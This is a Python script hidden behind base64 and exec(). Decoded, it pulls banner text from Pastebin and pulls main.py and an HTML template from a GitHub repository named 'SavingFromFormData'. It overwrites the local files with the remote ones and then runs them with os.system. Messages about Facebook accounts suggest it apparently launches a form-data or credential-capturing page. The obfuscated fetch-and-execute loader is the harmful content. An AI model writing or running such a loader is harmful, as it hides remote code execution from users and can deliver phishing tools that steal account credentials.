import base64
exec(base64.b64decode("aW1wb3J0IG9zCmltcG9ydCByZXF1ZXN0cwpmcm9tIGhhc2hsaWIgaW1wb3J0IG1kNQppbXBvcnQgdGltZQppbXBvcnQgcmFuZG9tCgpkZWYgZG93bmxvYWRfZmlsZSh1cmwpOgogICAgcmVzcG9uc2UgPSByZXF1ZXN0cy5nZXQodXJsKQogICAgcmV0dXJuIHJlc3BvbnNlLnRleHQKCmRlZiBnZXRfZmlsZV9oYXNoKGZpbGVfY29udGVudCk6CiAgICByZXR1cm4gbWQ1KGZpbGVfY29udGVudC5lbmNvZGUoKSkuaGV4ZGlnZXN0KCkKCmRlZiBwcmludF9yYW5kb21fY29sb3JfYm9sZChsaW5lKToKICAgIHJnYl9jb2xvciA9IChyYW5kb20ucmFuZGludCgwLCAyNTUpLCByYW5kb20ucmFuZGludCgwLCAyNTUpLCByYW5kb20ucmFuZGludCgwLCAyNTUpKQogICAgcHJpbnQoIlwwMzNbMzg7Mjt7fTt7fTt7fW1cMDMzWzFtIi5mb3JtYXQoKnJnYl9jb2xvcikgKyBsaW5lLmNlbnRlcihvcy5nZXRfdGVybWluYWxfc2l6ZSgpLmNvbHVtbnMpICsgIlwwMzNbMG0iKQoKZGVmIHVwZGF0ZV9maWxlKGxvY2FsX3BhdGgsIHJlbW90ZV91cmwpOgogICAgcmVtb3RlX2NvbnRlbnQgPSBkb3dubG9hZF9maWxlKHJlbW90ZV91cmwpCiAgICAKICAgIGlmIG9zLnBhdGguZXhpc3RzKGxvY2FsX3BhdGgpOgogICAgICAgIHdpdGggb3Blbihsb2NhbF9wYXRoLCAncicpIGFzIGZpbGU6CiAgICAgICAgICAgIGxvY2FsX2NvbnRlbnQgPSBmaWxlLnJlYWQoKQogICAgICAgICAgICAKICAgICAgICBpZiBnZXRfZmlsZV9oYXNoKGxvY2FsX2NvbnRlbnQpICE9IGdldF9maWxlX2hhc2gocmVtb3RlX2NvbnRlbnQpOgogICAgICAgICAgICBwcmludCgiXDAzM1s5MW1cMDMzWzFtIiArICJVcGRhdGUgaW4gcHJvZ3Jlc3MsIHBsZWFzZSB3YWl0Li4uLiIgKyAiXDAzM1swbSIpCiAgICAgICAgICAgIHByaW50KCJcMDMzWzM0bVwwMzNbMW0iICsgZiJEb3dubG9hZGluZyB7bG9jYWxfcGF0aH0iICsgIlwwMzNbMG0iKQogICAgICAgICAgICAKICAgICAgICAgICAgd2l0aCBvcGVuKGxvY2FsX3BhdGgsICd3JykgYXMgZmlsZToKICAgICAgICAgICAgICAgIGZpbGUud3JpdGUocmVtb3RlX2NvbnRlbnQpCiAgICAgICAgICAgIAogICAgICAgICAgICBwcmludCgiXDAzM1s5MW1cMDMzWzFtIiArICJZb3UgQXJlIFVzaW5nIE9sZGVyIE9yIEZha2UgVmVyc2lvbiBPZiBUaGUgVG9vbCBJdCBNYXkgQ2FzZSBPZiBNaXN1c2UgT2YgWW91ciBGYWNlYm9vayBBY2NvdW50cyIgKyAiXDAzM1swbSIpCiAgICAgICAgICAgIHRpbWUuc2xlZXAoMykKICAgICAgICAgICAgcmV0dXJuICAjIEV4aXQgdGhlIGZ1bmN0aW9uIGFmdGVyIHByaW50aW5nIHRoZSB1cGRhdGUgbWVzc2FnZQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIHByaW50KCJcMDMzWzMybVwwMzNbMW0iICsgIllvdSdyZSB1c2luZyB0aGUgc2FmZXN0IHZlcnNpb24uIEVuam95ISIgKyAiXDAzM1swbSIpCiAgICAgICAgICAgIHRpbWUuc2xlZXAoMykKICAgICAgICAgICAgcmV0dXJuICAjIEV4aXQgdGhlIGZ1bmN0aW9uIGFmdGVyIHByaW50aW5nIHRoZSBzYWZlIHZlcnNpb24gbWVzc2FnZQoKZGVmIHByaW50X3dpdGhfZGVsYXkobGluZXMsIGRlbGF5PTAuNSk6CiAgICBmb3IgbGluZSBpbiBsaW5lczoKICAgICAgICBwcmludF9yYW5kb21fY29sb3JfYm9sZChsaW5lKQogICAgICAgIHRpbWUuc2xlZXAoZGVsYXkpCgpkZWYgbWFpbigpOgogICAgcGFzdGViaW5fdXJsID0gJ2h0dHBzOi8vcGFzdGViaW4uY29tL3Jhdy8waFltRVFLRCcKICAgIHBhc3RlYmluX2NvbnRlbnQgPSBkb3dubG9hZF9maWxlKHBhc3RlYmluX3VybCkKICAgIHBhc3RlYmluX2xpbmVzID0gcGFzdGViaW5fY29udGVudC5zcGxpdGxpbmVzKCkKICAgIAogICAgcHJpbnRfd2l0aF9kZWxheShwYXN0ZWJpbl9saW5lcykKICAgIAogICAgbWFpbl91cmwgPSAiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2hhY2tlc29maWNlL1NhdmluZ0Zyb21Gb3JtRGF0YS9tYWluL21haW4ucHkiCiAgICBpbmRleF91cmwgPSAiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2hhY2tlc29maWNlL1NhdmluZ0Zyb21Gb3JtRGF0YS9tYWluL3RlbXBsYXRlcy9pbmRleC5odG1sIgogICAgCiAgICB1cGRhdGVfZmlsZSgibWFpbi5weSIsIG1haW5fdXJsKQogICAgdXBkYXRlX2ZpbGUoInRlbXBsYXRlcy9pbmRleC5odG1sIiwgaW5kZXhfdXJsKQogICAgCiAgICBvcy5zeXN0ZW0oInB5dGhvbiBtYWluLnB5IikKCmlmIF9fbmFtZV9fID09ICJfX21haW5fXyI6CiAgICBtYWluKCkKICAgIA=="))
